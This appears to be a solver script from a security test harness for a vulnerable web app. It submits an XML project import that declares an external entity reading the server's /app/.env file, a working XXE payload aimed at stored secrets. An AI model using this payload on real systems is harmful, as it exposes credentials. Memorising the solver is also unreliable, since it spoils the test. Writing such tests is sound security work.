// External entity resolution in project import: upload a document declaring a SYSTEM entity that
// points at a server-local file and reference it in a reflected element.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const owner = await ctx.login('persona_a')
  const doc = [
    '<?xml version="1.0"?>',
    '<!DOCTYPE import [ <!ENTITY ext SYSTEM "file:///app/.env"> ]>',
    '<import><note>&ext;</note><project name="Imported"/></import>',
  ].join('\n')
  await ctx.fetch(ctx.path('importProjects'), {
    method: 'POST',
    session: owner,
    headers: { 'content-type': 'application/xml' },
    body: doc,
  })
}
